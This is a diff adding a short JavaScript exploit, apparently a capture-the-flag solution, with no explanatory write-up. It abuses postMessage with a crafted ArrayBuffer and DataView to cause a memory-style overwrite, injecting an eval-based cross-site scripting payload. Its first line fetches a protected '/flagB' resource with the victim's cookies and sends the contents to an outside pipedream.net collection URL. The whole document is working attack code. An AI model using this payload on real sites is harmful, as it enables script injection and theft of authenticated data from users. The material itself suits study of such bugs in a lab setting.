@@ -1,0 +1,21 @@
+  let html = `fetch('/flagB',{credentials:'include'}).then(x=>x.text()).then(x=>fetch('https://en4czrzci0oxc.x.pipedream.net/'+x))//
+  \`
+  <button onclick="run()">runb</button>
+  <script>
+function run(){
+  let ab = new ArrayBuffer(0x22)
+  let ab_8 = new Uint8Array(ab);
+  ab_8.fill(0x41); // Fill with 0x41 (will partial overwrite io_buffer ptr)
+  ab_8[0x21] = 0; // Set null for end of unbounded copy
+  let sta = s=>s.split('').map((x,y)=>s.charCodeAt(y));
+  ab_8.set(sta("eval(iframe.src.slice(15))//")) // Put xss in buffer
+  let dv = new DataView(ab); // This will cause the length to be NaN
+  top.postMessage({type:'set_success_text',buffer:dv},"*")
+  top.postMessage({type:'vote'},"*")
+}
+run();
+  </script>
+  \`
+  `
+  location.hash = encodeURIComponent(JSON.stringify({html:html}));
+
